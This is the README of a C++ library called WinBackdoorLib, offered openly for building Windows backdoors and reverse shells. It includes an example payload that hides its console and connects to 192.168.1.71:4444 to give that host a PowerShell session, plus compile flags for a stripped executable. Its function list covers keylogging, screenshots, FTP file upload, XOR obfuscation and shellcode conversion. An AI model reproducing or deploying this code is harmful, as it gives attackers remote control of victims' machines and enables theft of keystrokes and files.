# WinBackdoorLib
a simple module to create "reverse shell or backdoor" simply with Windows API

![Image1](capture.PNG)


## example Payload :
  ```cpp
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define REMOTE_ADDR "192.168.1.71"
#define REMOTE_PORT 4444

int main()
{
    hide_console();
    WSADATA wsa_version;
    SOCKET socks;

    struct sockaddr_in session;

    session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    session.sin_family = AF_INET;
    session.sin_port = htons(REMOTE_PORT);

    WSAStartup(MAKEWORD(2,2),&wsa_version);
    socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
    int c = connect(socks,session);
    if (c == 0)
	{
        execute_powershell(socks);
    }
    return 0;
}
  ```

## Compile Payload :
  ### g++ backdoorlib.cpp reverse_powershell.cpp -o payload.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -lwininet
  

## List Function in Header :
```cpp
void hello_world(void);
char * raw_input(char *input_string);
int input(char *input_string);
void clear(void);
int substring_in_string(char *substring,char *string);
void print(char *string);
TCHAR *get_username();
int check_dir(char *pathname);
int tchar_substring_in_string(char *substring,TCHAR *string);
int StartsWith(const char *a, const char *b);
void hide_console(void);
void sleep(int number);
int connect(SOCKET socks_instance,struct sockaddr_in session);
int send(SOCKET socks_instance,char *buffer);
int recv(SOCKET socks_instance,char *buffer,int len);
void cmd_command(SOCKET socks_instance,char *command);
void powershell_command(SOCKET socks_instance,char*command);
void wsl_command(SOCKET socks_instance,char *command);
void execute_process(SOCKET socks_instance,char *process);
void execute_cmd(SOCKET socks_instance);
void execute_powershell(SOCKET socks_instance);
int download_to_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
int cd(char* path);
int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
void WriteLog(string filename, const char* key);
void WriteLogChar(string filename, char key);
int keylistener(string FILENAME_LOG, int key);
int keylogger_spawn(string FILENAME_LOG);
vector<string> split(const string& s, char delim);
string path_link(string link);
bool endswith(const std::string& str, const std::string& suffix);
bool startswith(const std::string& str, const std::string& prefix);
vector<int> GetScreenResolution(int& horizontal, int& vertical);
bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal);
bool screenshot(int x, int y, int w, int h, LPCSTR fname);
char* cmd_popen_char(const char* command, const char* mode, char* buffer);
char* pwd(char *buffer);
string tohex(string buffer);
string xor_string_enc_dec(string data, char key[]);
int xor_logic(int a, int b);
bool bool_xor_logic(bool a, bool b);
int getpid(const string& process_name);
string string_to_shellcode(string buffer);
string hex_to_shellcode(string buffer);
BOOL check_admin(void);
string read_file(string filename,string buffer_return);
string read_file_binary(string filename,string buffer_return);
string read_file_to_hex(string filename,string buffer_return);
string read_file_binary_to_hex(string filename,string buffer_return);
void open_process(LPCSTR process,LPCSTR args,LPCSTR dir);
char *get_system_info_by_powershell(char* buffer, char* mode);
```
